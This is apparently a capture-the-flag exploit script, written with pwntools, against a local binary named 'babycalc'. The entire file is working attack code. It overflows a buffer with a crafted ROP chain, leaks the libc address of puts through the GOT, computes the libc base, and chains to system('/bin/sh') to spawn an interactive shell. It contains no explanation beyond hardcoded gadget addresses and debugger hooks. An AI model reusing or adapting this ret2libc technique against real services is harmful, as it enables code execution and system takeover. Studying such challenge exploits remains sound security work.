from pwn import *
context.log_level="debug"
elf=ELF("./babycalc")
# [19,36,53,70,55,66,17,161,50,131,212,101,118,199,24,3]
def pwn():
    numlist=[19,36,53,70,55,66,17,161,50,131,212,101,118,199,24,3]
    payload=bytes(numlist)
    junk=b'a'*28
    leaveret=0x400BB7 
    retaddr=0x400C3C
    rdi=0x0000000000400ca3
    ret=0x400CA4
    start=0x400650
    main=0x400789
    puts_got=elf.got['puts']
    puts_plt=elf.plt['puts']
    ropchan=b'a'*(0x40-0x2+0x8)
    ropchan+=p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(ret)*10+p64(start)
    ropchan=ropchan.ljust(0xce,b'a')
    gdb.attach(sh,"b *0x400BB7\nc")
    pause()
    sh.sendafter(b":", b'24'+ropchan+payload+junk+p32(0x38))

    leak_libc=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
    success("leak_libc:"+hex(leak_libc))
    libc=elf.libc
    libcbase=leak_libc-libc.sym['puts']
    success("libcbase:"+hex(libcbase))
    libc.address=libcbase
    system=libc.sym['system']
    binsh=libc.search(b'/bin/sh').__next__()
    ropchan=b'a'*(0x70+0x30-0x2+0x8)
    ropchan+=p64(rdi)+p64(binsh)+p64(ret)+p64(system)
    ropchan=ropchan.ljust(0xce,b'a')
    # gdb.attach(sh)
    # pause()
    sh.sendafter(b":", b'24'+ropchan+payload+junk+p32(0x38))
sh=process("./babycalc")
pwn()
sh.interactive()
# while True:
#     sh=process("./babycalc")
#     try:
#         pwn()
#     except:
#         sh.close()
#         continue
#     sh.interactive()